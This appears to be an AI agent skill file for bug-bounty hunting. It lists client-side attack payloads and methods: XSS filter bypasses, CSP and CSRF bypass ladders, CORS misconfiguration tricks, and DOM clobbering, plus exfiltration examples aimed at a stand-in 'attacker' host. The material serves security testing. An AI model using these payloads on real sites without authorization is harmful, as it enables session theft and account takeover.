---
name: hunt-client-side
description: >-
  Hunt for client-side vulnerabilities — XSS (all contexts + filter bypasses), CSP bypass,
  CSRF, CORS misconfig, DOM-based attacks incl. clobbering. Built from personal notes. Use
  when input reflects into pages, CSP blocks payloads, state-changing endpoints lack
  tokens, or cross-origin data flows exist.
mitre_attack: [T1189, T1190, T1059.007, T1539]
---

# Client-Side Vulnerabilities (from your notes + advanced)

> See also (project skills): `hunt-xss` (174-report deep dive — owns the standalone XSS taxonomy). This skill is the broader client-side umbrella (CSP, CSRF, CORS, DOM) with the XSS payload library as a component.

## XSS (your notes)

**Methodology:** find input points (URL/POST/headers/cookies/uploads) → test reflection with unique canary → **View page via DevTools Elements (not View Source)** → identify context → payload → escalate impact (cookie/token theft PoC, not alert).

**Contexts (your payloads):**
- Raw HTML: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, nested `<scr<script>ipt>`, `%09` tab tricks.
- Attribute: `" autofocus onfocus=alert(1) x="`, `javascript:` href with HTML-decimal entity encoding.
- JS string: `';alert(1)//`, `"-alert(1)-"`, `\`;alert(1)//`, `</script><img src=1 onerror=alert(1)>`, template literal `${alert(1)}`.
- DOM: source→sink tracing (location.hash/search → innerHTML/eval/document.write).

**Filter bypasses (your library):**
- No `()`: `` alert`1` ``, `onerror=alert;throw 1`, `constructor.constructor`atob(...)`()`, regex-break `[math]+[sep]+[code]` (`1+1-alert`1``).
- No quotes: `&#x27;` / `%27`, `&quot;`.
- Keyword blacklist: `'ale'+'rt'`, `self['al'+'ert']`, `window[/al/.source+/ert/.source]`, case variation.
- Numbers→strings: `8680439..toString(30)` = "confirm".
- Encoding: Unicode `alert`, hex `a`, octal, Base64+eval, HTML entities.
- Regex-only filters: arithmetic prefix + separator tricks from your notes.

**Impact payloads:** cookie theft via `fetch`/`Image`, page content exfil, keylogger, redirect. **Blind XSS**: oastify/interact.sh/webhook callbacks — needed for admin panels/support tickets.

## CSP bypass (your notes)

**Weak-policy red flags:** `unsafe-inline`, `unsafe-eval`, `*`/`https:` in script-src, strict-dynamic + nonce, missing base-uri, allowed CDNs, report-uri with user input.

**Decision tree → technique:**
- unsafe-inline → plain XSS
- unsafe-eval → `data:;base64,...`
- strict-dynamic → **steal nonce** (`s.nonce = document.querySelector('[nonce]').nonce`) and reuse
- Wildcard → external script
- Allowed CDN → **JSONP endpoints** (google complete/search, youtube oembed, accounts revoke) with `callback=alert`
- AngularJS on whitelist → sandbox escape payloads (`{{$on.curry.call().alert(1)}}` / `$eval.constructor`)
- Missing base-uri → `<base href>` hijack of relative scripts
- Input reflected in policy → **policy injection** (`;script-src-elem *`)
- File upload + 'self' → `.wave`/polyglot upload
- All blocked → **DNS prefetch / WebRTC STUN exfil**, meta refresh, dangling markup (`<img src="https://attacker/?data=` auto-close), timing attack on SQLi-backed delay, RPO (`..%2f..%2f`), redirect-based path bypass, **max_input_vars PHP trick** (fill 1001 params → warnings flush headers before CSP).
- Tools: CSP Evaluator, report-uri, ModHeader for testing.

## CSRF (your notes)

**Flow:** state-changing + cookie auth → check token → check Referer/Origin → SameSite → content-type → method override.

**Bypass ladder:**
- No token → basic auto-submit PoC
- Token: delete param / empty value / token from **another account** / old token / change 1 char
- Referer checks: `<meta name="referrer" content="no-referrer">`, `history.pushState` + `unsafe-url`, domain spoofing (`target.com.evil.com`, `evil.com#target.com`)
- SameSite=Lax → GET + `window.location`; SameSite=Strict → open-redirect chain, path traversal to sensitive GET, sibling-subdomain XSS
- JSON body → `enctype="text/plain"` form trick (`name='{"email":"' value='"}'`), nested JSON, form-encoded, CORS misconfig fetch
- Method override: POST→GET, `?_method=DELETE`, `X-HTTP-Method-Override`
- Cookie-token double-submit → CRLF cookie injection, `/refresh-session` timing
- Burp "Generate CSRF PoC"; always test in a **fresh session**.

## CORS misconfig (your notes — 8 patterns)

**Vulnerable = reflected/null origin + `Allow-Credentials: true` + sensitive data.**
1. Origin reflection (`Access-Control-Allow-Origin: https://evil.com`)
2. **Null origin** via `sandbox` iframe srcdoc
3. **Regex/whitelist bypass ladder:** prefix `eviltarget.com`, suffix `target.com.evil.com`, underscore `target_.com` (Chrome), backtick `target`}.com` (Safari), URL-encoded dot, unescaped-regex dot `targetXcom`, any subdomain
4. Wildcard `*` → internal pivot (scan `192.168.x`, `[::1]`, `0.0.0.0` from victim browser)
5. Trusted subdomain + **XSS chain** on that subdomain
6. **HTTP origin trusted** (MITM entry)
7. **DNS rebinding** for localhost/internal (TTL flip)
8. **Cache poisoning**: reflection without `Vary: Origin`
Extras: JSONP callback to JS content-type, preflight bypass with `text/plain`.
Tools: Corsy, CORScanner, Burp match-replace Origin. PoC: `fetch(url,{credentials:'include'}).then(r=>r.text()).then(d=>send(attacker))`.

## DOM-based (your notes)

- Sources: `location.hash/search/href`, `document.URL/referrer`, `window.name`, storage, postMessage.
- Sinks: `eval`, `setTimeout(string)`, `innerHTML`, `document.write`, `location=`/replace/assign, `element.src`.
- No-paren payloads: backticks, `constructor.constructor`, `onerror=...;throw`, `f` escapes, `atob`.
- **DOM clobbering ladder:** `x.y` → `<a id=x name=y href=...>`; `x.y.value` → `<form><output>`; 3-level via nested forms/HTMLCollection; **bypass filters with `cid:` protocol**: `href="cid:&quot;onerror=alert`1`//"` (DOMPurify gap).
- Open redirect payloads via `location` with template literals + cookie exfil.

## 🚀 Advanced (beyond your notes)

- **mXSS (mutation XSS):** DOMPurify-class sanitizers can be beaten by parser differentials — `<noscript>`/`<foreignObject>`/`<mglyph>` namespace confusion payloads; test against the *actual* parser pipeline (innerHTML → outerHTML round-trip).
- **XS-Leaks:** when you can't read the response, leak the *state*: frame counting (window.frames.length), redirect timing, `performance.now()` diffs, `history.length`, CORB/COEP oracle differences — powerful for cross-site data inference on APIs.
- **postMessage:** listeners without `e.origin` checks, `e.source` confusion, and sinks receiving message data → DOM XSS via messaging; PoC from an attacker window with `targetWin.postMessage(payload,'*')`.
- **Prototype pollution (client-side):** `?__proto__[isAdmin]=1` / `?constructor.prototype.x=1` on jQuery `$.extend(true,{},urlParams)` sinks; find gadgets: `ppmap`, browser-console checks (`Object.prototype`), script gadgets (jQuery `globalEval` chains).
- **Dangling markup exfil (no JS at all):** `<img src='https://attacker/?` left unclosed — browser auto-closes at next quote, exfiltrating the following page content in the URL; bypasses script-src entirely when img-src is open.
- **CSS injection → data exfil:** attribute selectors (`input[value^=a]`) + background URL fetch can brute-force token characters without any JavaScript.
- **Login CSRF:** attacker logs victim into **attacker's** account (login form without CSRF token) — under-reported; enables later ATO via stored data in "their" account.
- **Trusted Types:** if enforced, test for policy gaps (default policy bypass via `defaultPolicy.createHTML` sinks left open, or `trusted-types *` misconfigs).
- **COOP/COEP/CORP interplay:** relaxed CORP on API responses + `window.open` reference leaks (opener) can bypass isolation-based defenses.

## Validation checklist
- [ ] XSS executes on real origin (`alert(document.domain)` proof), survives stored path for other users
- [ ] CSP bypass works in latest Chrome+Firefox, PoC exfils real data
- [ ] CSRF: executed in fresh session from hosted PoC page; impactful action
- [ ] CORS: exfil from foreign origin with credentials on sensitive data + cache variant checked
- [ ] DOM clobbering/pollution: real gadget impact (JS read of poisoned property), not just accepted input